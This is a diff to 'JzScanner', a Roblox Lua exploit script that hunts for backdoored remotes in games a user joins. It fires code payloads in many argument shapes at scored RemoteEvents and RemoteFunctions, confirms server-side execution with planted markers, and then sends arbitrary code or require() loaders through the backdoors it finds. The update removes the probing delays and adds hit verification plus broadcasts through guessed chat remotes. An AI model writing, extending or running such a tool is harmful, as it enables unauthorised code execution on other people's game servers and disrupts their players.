@@ -7,7 +7,7 @@ local SoundService = game:GetService("SoundService")
 local LocalPlayer = Players.LocalPlayer
 local PlayerName = LocalPlayer.Name
 
-local VERSION = "4.5"
+local VERSION = "5.0"
 local BOOT_STAMP = os.date("%H:%M:%S")
 
 local ROOT_W = 470
@@ -21,9 +21,7 @@ local THEMES_LIST = {
 }
 
 local CONFIG = {
-	ProbeDelay = 0.08,
 	BatchSize = 40,
-	BatchPause = 0.35,
 	ConfirmWindow = 6,
 	ExtraWindow = 1.5,
 	SweepMaxTime = 60,
@@ -64,6 +62,7 @@ local State = {
 	results = {},
 	requires = {},
 	resultFilter = "ALL",
+	resultSearch = "",
 	themeIndex = 1,
 	targetPaths = { "LOCAL" },
 	targetRefs = { nil },
@@ -124,6 +123,10 @@ local KEYWORDS = {
 	["vortex"] = 2,
 	["phantom"] = 2,
 	["ibackdoor"] = 5,
+	["mainmodule"] = 4,
+	["runcode"] = 5,
+	["runstring"] = 4,
+	["getfenv"] = 2,
 }
 
 local UI = {}
@@ -138,7 +141,9 @@ local function create(className, props)
 	local inst = Instance.new(className)
 	for k, v in pairs(props) do
 		if k ~= "Parent" then
-			inst[k] = v
+			pcall(function()
+				inst[k] = v
+			end)
 		end
 	end
 	if props.Parent then
@@ -172,28 +177,6 @@ local function hoverify(btn, base, hovered)
 	end)
 end
 
-local function bindClick(btn, fn)
-	State.bindCount = State.bindCount + 1
-	pcall(function()
-		btn:SetAttribute("JZ_WIRED", true)
-	end)
-	local last = 0
-	local function fire(...)
-		local now = tick()
-		if now - last < 0.25 then
-			return
-		end
-		last = now
-		local ok, err = pcall(fn, ...)
-		if not ok then
-			log("BAD", "button error: " .. tostring(err))
-		end
-	end
-	btn.MouseButton1Click:Connect(fire)
-	btn.Activated:Connect(fire)
-	btn.TouchTap:Connect(fire)
-end
-
 local LOG_COLORS = {
 	INFO = THEME.dim,
 	WARN = THEME.warn,
@@ -218,6 +201,28 @@ local function log(level, msg)
 	if UI.renderLogs and not State.destroyed then
 		UI.renderLogs()
 	end
+end
+
+local function bindClick(btn, fn)
+	State.bindCount = State.bindCount + 1
+	pcall(function()
+		btn:SetAttribute("JZ_WIRED", true)
+	end)
+	local last = 0
+	local function fire(...)
+		local now = tick()
+		if now - last < 0.25 then
+			return
+		end
+		last = now
+		local ok, err = pcall(fn, ...)
+		if not ok then
+			log("BAD", "button error: " .. tostring(err))
+		end
+	end
+	btn.MouseButton1Click:Connect(fire)
+	btn.Activated:Connect(fire)
+	btn.TouchTap:Connect(fire)
 end
 
 local function playSound()
@@ -396,7 +401,7 @@ local function toast(title, body, color)
 			Parent = list,
 		})
 	end
-	card.LayoutOrder = -os.clock()
+	card.LayoutOrder = -math.floor(os.clock() * 1000)
 	card.Position = UDim2.new(0, 0, 0, -80)
 	TweenService:Create(card, TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
 		Position = UDim2.new(0, 0, 0, 0),
@@ -490,6 +495,37 @@ task.spawn(function()
 	end
 end)
 
+local function makeDraggable(handle, target)
+	local dragging = false
+	local dragStart, startPos
+	handle.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = target.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	UserInputService.InputChanged:Connect(function(input)
+		if
+			dragging
+			and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch)
+		then
+			local delta = input.Position - dragStart
+			target.Position = UDim2.new(
+				startPos.X.Scale,
+				startPos.X.Offset + delta.X,
+				startPos.Y.Scale,
+				startPos.Y.Offset + delta.Y
+			)
+		end
+	end)
+end
+
 local Root = create("Frame", {
 	Name = "JzScannerRoot",
 	Size = UDim2.new(0, ROOT_W, 0, ROOT_H),
@@ -511,6 +547,7 @@ local TitleBar = create("Frame", {
 	Active = true,
 	Parent = Root,
 })
+makeDraggable(TitleBar, Root)
 
 create("TextLabel", {
 	Size = UDim2.new(1, -80, 1, 0),
@@ -696,9 +733,19 @@ local function setStats()
 	UI.StatusRight.Text = ("probed %d | hits %d"):format(State.stats.probed, State.stats.confirmed)
 end
 
+local mc = math.clamp or function(v, lo, hi)
+	if v < lo then
+		return lo
+	end
+	if v > hi then
+		return hi
+	end
+	return v
+end
+
 local function setProgress(frac, label)
-	UI.ProgressFill.Size = UDim2.new(math.clamp(frac, 0, 1), 0, 1, 0)
-	UI.ProgressPct.Text = tostring(math.floor(math.clamp(frac, 0, 1) * 100)) .. "%"
+	UI.ProgressFill.Size = UDim2.new(mc(frac, 0, 1), 0, 1, 0)
+	UI.ProgressPct.Text = tostring(math.floor(mc(frac, 0, 1) * 100)) .. "%"
 	if label then
 		UI.ScanStatus.Text = label
 	end
@@ -728,6 +775,83 @@ local function scoreRemote(remote)
 		table.insert(reasons, "random-name+2")
 	end
 	return score, table.concat(reasons, " ")
+end
+
+local function markerPayload(prefix, guid)
+	return table.concat({
+		'pcall(function() workspace:SetAttribute("' .. prefix .. guid .. '",true) end)',
+		'pcall(function() local s=Instance.new("StringValue") s.Name="' .. prefix .. guid .. '" s.Parent=workspace end)',
+		'pcall(function() local s=Instance.new("StringValue") s.Name="' .. prefix .. guid .. '" s.Parent=game:GetService("Lighting") end)',
+	}, " ")
+end
+
+-- different argument shapes real backdoors accept; each carries the same marker code
+local function probeVariants(payload)
+	return {
+		payload,
+		{ payload },
+		{ code = payload },
+		{ Code = payload },
+		{ source = payload },
+		{ src = payload },
+		"loadstring|" .. payload,
+		"run:" .. payload,
+	}
+end
+
+local function sendPayload(remote, payload)
+	if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+		return pcall(remote.FireServer, remote, payload)
+	end
+	return pcall(remote.InvokeServer, remote, payload)
+end
+
+-- score structural signals beyond the name: parent location, sibling names, argument hints
+local STRUCT_BONUS = {
+	ReplicatedStorage = 1,
+	ReplicatedFirst = 1,
+	Lighting = 2,
+	ServerStorage = 3,
+	ServerScriptService = 3,
+}
+local function structuralScore(remote)
+	local bonus = 0
+	local tags = {}
+	local okParent, parent = pcall(function()
+		return remote.Parent
+	end)
+	if okParent and parent then
+		local okName, pname = pcall(function()
+			return parent.Name
+		end)
+		if okName and pname then
+			local b = STRUCT_BONUS[pname]
+			if b then
+				bonus = bonus + b
+				table.insert(tags, "in-" .. pname .. "+" .. b)
+			end
+			if pname:lower():find("backdoor", 1, true) or pname:lower():find("remote", 1, true) then
+				bonus = bonus + 2
+				table.insert(tags, "suspicious-parent+2")
+			end
+		end
+		local okSib, sibs = pcall(function()
+			return parent:GetChildren()
+		end)
+		if okSib and sibs then
+			for _, s in ipairs(sibs) do
+				if s ~= remote and s:IsA("ModuleScript") then
+					local n = s.Name:lower()
+					if n:find("mainmodule", 1, true) or n:find("backdoor", 1, true) or n:find("serverside", 1, true) then
+						bonus = bonus + 3
+						table.insert(tags, "bd-module-sibling+3")
+						break
+					end
+				end
+			end
+		end
+	end
+	return bonus, table.concat(tags, " ")
 end
 
 local function harvestRequireIds(obj, found, counters)
@@ -936,7 +1060,11 @@ local function renderResults()
 	end
 	local shown = 0
 	for i, r in ipairs(State.results) do
-		if State.resultFilter == "ALL" or r.hits > 0 then
+		local matchesFilter = State.resultFilter == "ALL" or r.hits > 0
+		local matchesSearch = State.resultSearch == ""
+			or r.fullPath:lower():find(State.resultSearch, 1, true) ~= nil
+			or r.remote.Name:lower():find(State.resultSearch, 1, true) ~= nil
+		if matchesFilter and matchesSearch then
 			shown = shown + 1
 			local row = create("Frame", {
 				Size = UDim2.new(1, -6, 0, 40),
@@ -948,12 +1076,18 @@ local function renderResults()
 			})
 			corner(row, 7)
 			local badgeColor = r.hits > 0 and THEME.good or (r.score >= 3 and THEME.warn or THEME.dim)
+			local badgeText
+			if r.hits > 0 then
+				badgeText = r.verified and "VRFY" or "HIT!"
+			else
+				badgeText = tostring(r.score)
+			end
 			local badge = create("TextLabel", {
 				Size = UDim2.new(0, 48, 1, -8),
 				Position = UDim2.new(0, 4, 0, 4),
 				BackgroundColor3 = badgeColor,
 				BackgroundTransparency = 0.15,
-				Text = r.hits > 0 and "HIT!" or tostring(r.score),
+				Text = badgeText,
 				TextColor3 = Color3.fromRGB(10, 10, 14),
 				TextSize = r.hits > 0 and 12 or 14,
 				Font = Enum.Font.GothamBold,
@@ -1036,10 +1170,20 @@ local function renderResults()
 		end
 	end
 	if shown == 0 then
+		local emptyText
+		if #State.results == 0 then
+			emptyText = "No results yet — run a scan"
+		elseif State.resultSearch ~= "" then
+			emptyText = 'Nothing matches "' .. State.resultSearch .. '"'
+		elseif State.resultFilter == "HITS" then
+			emptyText = "No confirmed hits yet"
+		else
+			emptyText = "No results to show"
+		end
 		create("TextLabel", {
 			Size = UDim2.new(1, -6, 0, 36),
 			BackgroundTransparency = 1,
-			Text = State.resultFilter == "HITS" and "No confirmed hits yet" or "No results yet — run a scan",
+			Text = emptyText,
 			TextColor3 = THEME.dim,
 			TextSize = 12,
 			Font = Enum.Font.Gotham,
@@ -1189,11 +1333,6 @@ local function renderRequires()
 		bindClick(remB, function()
 			local ref = State.targetRefs[State.targetIndex]
 			local code = ('require(%s)("%s")'):format(rq.id, PlayerName)
-			local confirmGuid
-			if State.settings.confirmExec then
-				confirmGuid = newGuid()
-				code = code .. '\nworkspace:SetAttribute("JZXE_' .. confirmGuid .. '",true)'
-			end
 			task.spawn(function()
 				if ref == nil then
 					local f = loadstring or load
@@ -1206,13 +1345,11 @@ local function renderRequires()
 					outputLine("[i] target was LOCAL — ran locally instead")
 					return
 				end
-				if ref:IsA("RemoteEvent") then
-					local ok = pcall(ref.FireServer, ref, code)
-					outputLine(ok and ("sent require(" .. rq.id .. ") -> " .. ref.Name) or "[x] FireServer failed")
-				else
-					local ok, res = pcall(ref.InvokeServer, ref, code)
-					outputLine(ok and ("sent -> " .. ref.Name .. ": " .. tostring(res)) or "[x] InvokeServer failed")
-				end
+				local ok, res = sendPayload(ref, code)
+				outputLine(
+					ok and ("sent require(" .. rq.id .. ") -> " .. ref.Name .. ": " .. tostring(res))
+						or "[x] send failed"
+				)
 				log("INFO", "sent require(" .. rq.id .. ") to " .. ref.Name)
 			end)
 		end)
@@ -1333,16 +1470,38 @@ UI.StatsLbl = create("TextLabel", {
 })
 
 create("TextLabel", {
-	Size = UDim2.new(0, 276, 0, 11),
+	Size = UDim2.new(0, 148, 0, 11),
 	Position = UDim2.new(0, 0, 0, 104),
 	BackgroundTransparency = 1,
-	Text = 'Green "HIT!" = confirmed backdoor',
+	Text = 'Green "HIT!" = confirmed',
 	TextColor3 = THEME.dim,
 	TextSize = 9,
 	Font = Enum.Font.Gotham,
 	TextXAlignment = Enum.TextXAlignment.Left,
 	Parent = ScanPage,
 })
+
+UI.SearchBox = create("TextBox", {
+	Size = UDim2.new(0, 122, 0, 16),
+	Position = UDim2.new(0, 154, 0, 101),
+	BackgroundColor3 = Color3.fromRGB(8, 8, 12),
+	BackgroundTransparency = 0.1,
+	Text = "",
+	PlaceholderText = "search results...",
+	PlaceholderColor3 = THEME.dim,
+	TextColor3 = THEME.text,
+	TextSize = 9,
+	Font = Enum.Font.Code,
+	ClearTextOnFocus = false,
+	BorderSizePixel = 0,
+	Parent = ScanPage,
+})
+corner(UI.SearchBox, 4)
+
+UI.SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
+	State.resultSearch = UI.SearchBox.Text:lower():gsub("^%s+", ""):gsub("%s+$", "")
+	renderResults()
+end)
 
 UI.FilterBtn = create("TextButton", {
 	Size = UDim2.new(0, 82, 0, 13),
@@ -1444,7 +1603,6 @@ create("TextLabel", {
 	Font = Enum.Font.Gotham,
 	TextXAlignment = Enum.TextXAlignment.Left,
 	TextWrapped = true,
-	VerticalCenter = true,
 	Parent = ExecPage,
 })
 
@@ -1620,7 +1778,6 @@ UI.ReqCountLbl = create("TextLabel", {
 	Font = Enum.Font.Code,
 	TextXAlignment = Enum.TextXAlignment.Left,
 	TextTruncate = Enum.TextTruncate.AtEnd,
-	VerticalCenter = true,
 	Parent = ReqsPage,
 })
 
@@ -1663,7 +1820,6 @@ UI.HistCountLbl = create("TextLabel", {
 	Font = Enum.Font.Code,
 	TextXAlignment = Enum.TextXAlignment.Left,
 	TextTruncate = Enum.TextTruncate.AtEnd,
-	VerticalCenter = true,
 	Parent = GamesPage,
 })
 
@@ -1909,19 +2065,13 @@ local function makeSettingToggle(y, labelText, key)
 	local btn = create("TextButton", {
 		Size = UDim2.new(0, 96, 0, 28),
 		Position = UDim2.new(1, -96, 0, y),
-		BackgroundColor3 = THEME.good,
-		Text = "ON",
-		TextColor3 = Color3.fromRGB(8, 14, 10),
-		TextSize = 12,
-		Font = Enum.Font.GothamBold,
+		Text = "",
 		BorderSizePixel = 0,
 		AutoButtonColor = false,
 		Parent = SetupPage,
 	})
 	corner(btn, 7)
-	hoverify(btn, THEME.good, Color3.fromRGB(45, 165, 90))
-	bindClick(btn, function()
-		State.settings[key] = not State.settings[key]
+	local function refresh()
 		if State.settings[key] then
 			btn.BackgroundColor3 = THEME.good
 			btn.Text = "ON"
@@ -1931,6 +2081,21 @@ local function makeSettingToggle(y, labelText, key)
 			btn.Text = "OFF"
 			btn.TextColor3 = THEME.dim
 		end
+	end
+	btn.MouseEnter:Connect(function()
+		TweenService:Create(btn, TweenInfo.new(0.12), {
+			BackgroundColor3 = State.settings[key] and Color3.fromRGB(45, 165, 90) or THEME.btnHover,
+		}):Play()
+	end)
+	btn.MouseLeave:Connect(function()
+		TweenService:Create(btn, TweenInfo.new(0.12), {
+			BackgroundColor3 = State.settings[key] and THEME.good or THEME.panel2,
+		}):Play()
+	end)
+	refresh()
+	bindClick(btn, function()
+		State.settings[key] = not State.settings[key]
+		refresh()
 		log("INFO", "setting " .. key .. " = " .. tostring(State.settings[key]))
 	end)
 end
@@ -1974,7 +2139,17 @@ bindClick(UI.ThemeBtn, function()
 	applyTheme()
 	log("INFO", "theme = " .. t.name)
 end)
-hoverify(UI.ThemeBtn, THEMES_LIST[State.themeIndex].c, Color3.fromRGB(0, 190, 172))
+UI.ThemeBtn.MouseEnter:Connect(function()
+	local c = THEMES_LIST[State.themeIndex].c
+	TweenService:Create(UI.ThemeBtn, TweenInfo.new(0.12), {
+		BackgroundColor3 = c:Lerp(Color3.new(1, 1, 1), 0.2),
+	}):Play()
+end)
+UI.ThemeBtn.MouseLeave:Connect(function()
+	TweenService:Create(UI.ThemeBtn, TweenInfo.new(0.12), {
+		BackgroundColor3 = THEMES_LIST[State.themeIndex].c,
+	}):Play()
+end)
 
 create("TextLabel", {
 	Size = UDim2.new(1, 0, 0, 104),
@@ -1982,7 +2157,7 @@ create("TextLabel", {
 	BackgroundTransparency = 1,
 	Text = "JzScanner "
 		.. VERSION
-		.. "\nengine: guid-traced payloads + attribute/instance dual-marker confirmation\nsignals: 39 weighted keywords · random-name detection · invoke responses\ngames with confirmed backdoors are remembered in the SAVED tab\ncheck the title bar boot time to spot stale duplicate windows",
+		.. "\nengine: guid-traced tri-channel markers (attribute + workspace + lighting)\nconfirmation: verified hits are re-probed with a fresh marker\nsignals: weighted keywords · random-name detection · invoke responses\ngames with confirmed backdoors are remembered in the SAVED tab\ndrag the title bar to move · INSERT toggles the window",
 	TextColor3 = THEME.dim,
 	TextSize = 10,
 	Font = Enum.Font.Code,
@@ -2060,14 +2235,17 @@ bindClick(UI.CopyAllBtn, function()
 	end
 end)
 
-UI.RequireIdBox:GetPropertyChangedSignal("Text"):Connect(function()
+local function updateRequirePreview()
 	local id = UI.RequireIdBox.Text:match("%d+") or "ID"
 	local args = UI.RequireArgsBox.Text
 	if args == "" then
 		args = '"' .. PlayerName .. '"'
 	end
 	UI.RequirePreview.Text = ("preview: require(%s)(%s)"):format(id, args)
-end)
+end
+
+UI.RequireIdBox:GetPropertyChangedSignal("Text"):Connect(updateRequirePreview)
+UI.RequireArgsBox:GetPropertyChangedSignal("Text"):Connect(updateRequirePreview)
 
 local ballDown = false
 local ballDragStart, ballStartPos, ballMoved
@@ -2146,7 +2324,11 @@ UserInputService.InputBegan:Connect(function(input, processed)
 		return
 	end
 	if input.KeyCode == Enum.KeyCode.Insert then
-		parentGui.Enabled = not parentGui.Enabled
+		if State.minimized then
+			setMinimized(false)
+		else
+			Root.Visible = not Root.Visible
+		end
 	end
 end)
 
@@ -2173,21 +2355,43 @@ local function runLocal(code)
 end
 
 local function watchExecMarker(g)
-	local conn
-	conn = workspace.AttributeChanged:Connect(function(attr)
-		if attr == "JZXE_" .. g then
-			conn:Disconnect()
-			outputLine("[ok] SERVER CONFIRMED EXECUTION")
-			log("GOOD", "execution confirmed via attribute marker")
-			playSound()
+	local done = false
+	local conns = {}
+	local function finish(confirmed)
+		if done then
+			return
 		end
-	end)
-	task.delay(CONFIG.ExecConfirmWindow, function()
-		if conn.Connected then
-			conn:Disconnect()
+		done = true
+		for _, c in ipairs(conns) do
+			c:Disconnect()
+		end
+		if confirmed then
+			outputLine("[ok] SERVER CONFIRMED EXECUTION")
+			log("GOOD", "execution confirmed via server marker")
+			playSound()
+		else
 			outputLine("[!] no confirmation in " .. CONFIG.ExecConfirmWindow .. "s (code may still have run)")
 			log("WARN", "execution unconfirmed")
 		end
+	end
+	table.insert(
+		conns,
+		workspace.AttributeChanged:Connect(function(attr)
+			if attr == "JZXE_" .. g then
+				finish(true)
+			end
+		end)
+	)
+	table.insert(
+		conns,
+		game.DescendantAdded:Connect(function(child)
+			if child.Name == "JZXE_" .. g then
+				finish(true)
+			end
+		end)
+	)
+	task.delay(CONFIG.ExecConfirmWindow, function()
+		finish(false)
 	end)
 end
 
@@ -2221,27 +2425,52 @@ local function executeCurrent()
 		end
 	end
 	local confirmGuid
-	if State.settings.confirmExec then
-		confirmGuid = newGuid()
-		code = code .. '\nworkspace:SetAttribute("JZXE_' .. confirmGuid .. '",true)'
-	end
 	local ref = State.targetRefs[State.targetIndex]
+	if ref ~= nil and State.settings.confirmExec then
+		confirmGuid = newGuid()
+		code = code .. "\n" .. markerPayload("JZXE_", confirmGuid)
+	end
 	if ref == nil then
 		runLocal(code)
 	else
 		outputLine("> sending " .. #code .. " bytes -> " .. ref.Name)
+		if confirmGuid then
+			watchExecMarker(confirmGuid)
+		end
 		task.spawn(function()
-			if confirmGuid then
-				watchExecMarker(confirmGuid)
+			local isFunc = ref:IsA("RemoteFunction")
+			local shapes = { code }
+			-- reuse the argument shape that worked during scanning when known
+			for _, m in ipairs(State.results) do
+				if m.remote == ref and m.workingShape ~= nil then
+					shapes = { m.workingShape }
+					break
+				end
 			end
-			if ref:IsA("RemoteEvent") then
-				local ok = pcall(ref.FireServer, ref, code)
-				outputLine(ok and "[ok] RemoteEvent fired" or "[x] FireServer failed")
+			if shapes[1] == code and #shapes == 1 then
+				shapes = probeVariants(code)
+			end
+			local sent = false
+			for _, shape in ipairs(shapes) do
+				local ok, res = sendPayload(ref, shape)
+				if ok then
+					sent = true
+					if isFunc and res ~= nil then
+						outputLine("[ok] invoked, returned: " .. tostring(res))
+					elseif isFunc then
+						outputLine("[ok] invoked " .. ref.Name)
+					else
+						outputLine("[ok] payload sent to " .. ref.Name)
+					end
+					break
+				end
+			end
+			if not sent then
+				outputLine("[x] all send attempts failed")
+				log("BAD", "could not deliver payload to " .. ref.Name)
 			else
-				local ok, res = pcall(ref.InvokeServer, ref, code)
-				outputLine(ok and ("[ok] invoked, returned: " .. tostring(res)) or ("[x] InvokeServer failed: " .. tostring(res)))
+				log("INFO", "payload sent to " .. ref.Name .. " (" .. mode .. ")")
 			end
-			log("INFO", "payload sent to " .. ref.Name .. " (" .. mode .. ")")
 		end)
 	end
 end
@@ -2251,6 +2480,7 @@ bindClick(UI.ExecBtn, executeCurrent)
 local function hintBroadcast(message)
 	task.spawn(function()
 		local sent = false
+		-- channel 1: modern text chat
 		pcall(function()
 			local tcs = game:GetService("TextChatService")
 			local ch = tcs:FindFirstChild("TextChannels")
@@ -2260,6 +2490,7 @@ local function hintBroadcast(message)
 				sent = true
 			end
 		end)
+		-- channel 2: legacy chat
 		if not sent then
 			pcall(function()
 				local rs = game:GetService("ReplicatedStorage")
@@ -2268,6 +2499,26 @@ local function hintBroadcast(message)
 				if say then
 					say:FireServer(message, "All")
 					sent = true
+				end
+			end)
+		end
+		-- channel 3: known broadcast remotes games commonly expose
+		if not sent then
+			pcall(function()
+				for _, obj in ipairs(game:GetDescendants()) do
+					if obj:IsA("RemoteEvent") then
+						local n = obj.Name:lower()
+						if
+							n:find("broadcast", 1, true)
+							or n:find("announce", 1, true)
+							or n:find("notifyall", 1, true)
+							or n:find("chatmsg", 1, true)
+						then
+							pcall(obj.FireServer, obj, message)
+							sent = true
+							break
+						end
+					end
 				end
 			end)
 		end
@@ -2387,6 +2638,10 @@ local function runScanCore()
 	State.hintSentThisScan = false
 	State.stats = { total = 0, probed = 0, confirmed = 0 }
 	State.results = {}
+	State.resultSearch = ""
+	if UI.SearchBox then
+		UI.SearchBox.Text = ""
+	end
 	State.targetPaths = { "LOCAL" }
 	State.targetRefs = { nil }
 	State.targetIndex = 1
@@ -2403,7 +2658,7 @@ local function runScanCore()
 	for _, obj in ipairs(game:GetDescendants()) do
 		count = count + 1
 		local cn = obj.ClassName
-		if cn == "RemoteEvent" or cn == "RemoteFunction" then
+		if cn == "RemoteEvent" or cn == "RemoteFunction" or cn == "UnreliableRemoteEvent" then
 			table.insert(remotes, obj)
 		elseif cn == "ModuleScript" or cn == "LocalScript" or cn == "Script" then
 			harvestRequireIds(obj, reqFound, reqCounters)
@@ -2447,7 +2702,7 @@ local function runScanCore()
 	State.results = order
 
 	local instConn
-	instConn = workspace.DescendantAdded:Connect(function(child)
+	instConn = game.DescendantAdded:Connect(function(child)
 		local g = child.Name:match("^JZX_(%x+)$")
 		if g and markers[g] then
 			markFound(markers[g])
@@ -2465,6 +2720,11 @@ local function runScanCore()
 	local scored = {}
 	for _, r in ipairs(remotes) do
 		local s, why = scoreRemote(r)
+		local sb, stags = structuralScore(r)
+		if sb > 0 then
+			s = s + sb
+			why = why .. (why ~= "" and " " or "") .. stags
+		end
 		if s >= minScore then
 			table.insert(scored, { remote = r, score = s, reason = why })
 		end
@@ -2484,33 +2744,45 @@ local function runScanCore()
 			break
 		end
 		local g = newGuid()
+		local okPath, fullPath = pcall(function()
+			return entry.remote:GetFullName()
+		end)
 		local m = {
 			remote = entry.remote,
 			score = entry.score,
 			reason = entry.reason,
 			displayReason = entry.reason ~= "" and entry.reason or "no name signals",
-			fullPath = "",
-			pathShort = "",
+			fullPath = okPath and fullPath or (entry.remote.Name .. "?"),
 			guid = g,
 			hits = 0,
 			reported = false,
 		}
 		markers[g] = m
 		table.insert(order, m)
-		local payload = 'workspace:SetAttribute("JZX_'
-			.. g
-			.. '",true) Instance.new("StringValue",workspace).Name="JZX_'
-			.. g
-			.. '"'
+		local payload = markerPayload("JZX_", g)
 		task.spawn(function()
-			if entry.remote:IsA("RemoteEvent") then
-				pcall(entry.remote.FireServer, entry.remote, payload)
-			else
-				local ok, res = pcall(entry.remote.InvokeServer, entry.remote, payload)
-				if not ok and type(res) == "string" then
-					m.errorSignal = res
-				elseif ok and res ~= nil then
-					m.returnSignal = res
+			local variants = probeVariants(payload)
+			local isFunc = entry.remote:IsA("RemoteFunction")
+			for vi, v in ipairs(variants) do
+				if m.hits > 0 then
+					break
+				end
+				if isFunc then
+					local ok, res = sendPayload(entry.remote, v)
+					if not ok and type(res) == "string" then
+						m.errorSignal = res
+					elseif ok and res ~= nil then
+						m.returnSignal = res
+						m.workingShape = v
+					end
+				else
+					sendPayload(entry.remote, v)
+				end
+				if m.hits > 0 and m.workingShape == nil then
+					m.workingShape = v
+				end
+				if vi < #variants then
+					task.wait()
 				end
 			end
 		end)
@@ -2533,9 +2805,7 @@ local function runScanCore()
 			break
 		end
 		if i % CONFIG.BatchSize == 0 then
-			task.wait(CONFIG.BatchPause)
-		else
-			task.wait(CONFIG.ProbeDelay)
+			task.wait()
 		end
 	end
 
@@ -2557,16 +2827,57 @@ local function runScanCore()
 			m.score = m.score + 2
 			m.displayReason = m.displayReason .. " · returned-value+2"
 		end
-		local ok, fullPath = pcall(function()
-			return m.remote:GetFullName()
-		end)
-		m.fullPath = ok and fullPath or (m.remote.Name .. "?")
-		m.pathShort = m.fullPath
-		if #m.pathShort > 40 then
-			m.pathShort = "…" .. m.pathShort:sub(-39)
+	end
+
+	local verifyList = {}
+	for _, m in ipairs(order) do
+		if m.hits > 0 then
+			table.insert(verifyList, m)
 		end
-		if m.reported then
-			m.displayReason = "executes code server-side — press EXEC"
+	end
+	if #verifyList > 0 and not State.destroyed then
+		setProgress(0.92, "Verifying " .. #verifyList .. " hit(s) with fresh markers...")
+		log("INFO", "verification pass: re-probing " .. #verifyList .. " hit(s)")
+		local vMarkers = {}
+		for _, m in ipairs(verifyList) do
+			m.verifyGuid = newGuid()
+			m.verified = false
+			vMarkers[m.verifyGuid] = m
+		end
+		local vInst
+		vInst = game.DescendantAdded:Connect(function(child)
+			local g = child.Name:match("^JZV_(%x+)$")
+			if g and vMarkers[g] then
+				vMarkers[g].verified = true
+			end
+		end)
+		local vAttr
+		vAttr = workspace.AttributeChanged:Connect(function(attr)
+			local g = attr:match("^JZV_(%x+)$")
+			if g and vMarkers[g] then
+				vMarkers[g].verified = true
+			end
+		end)
+		for _, m in ipairs(verifyList) do
+			local payload = markerPayload("JZV_", m.verifyGuid)
+			task.spawn(function()
+				sendPayload(m.remote, payload)
+			end)
+		end
+		local vEnd = os.clock() + 4
+		while os.clock() < vEnd and not State.destroyed do
+			task.wait(0.1)
+		end
+		vInst:Disconnect()
+		vAttr:Disconnect()
+		for _, m in ipairs(verifyList) do
+			if m.verified then
+				m.displayReason = "VERIFIED — executes code server-side · press EXEC"
+				log("GOOD", "verified: " .. m.fullPath)
+			else
+				m.displayReason = "hit, but re-check failed (laggy or one-shot channel)"
+				log("WARN", "unverified hit: " .. m.fullPath)
+			end
 		end
 	end
 
@@ -2575,6 +2886,13 @@ local function runScanCore()
 		local bc = b.hits > 0
 		if ac ~= bc then
 			return ac
+		end
+		if ac and bc then
+			local av = a.verified and 1 or 0
+			local bv = b.verified and 1 or 0
+			if av ~= bv then
+				return av > bv
+			end
 		end
 		if a.hits ~= b.hits then
 			return a.hits > b.hits
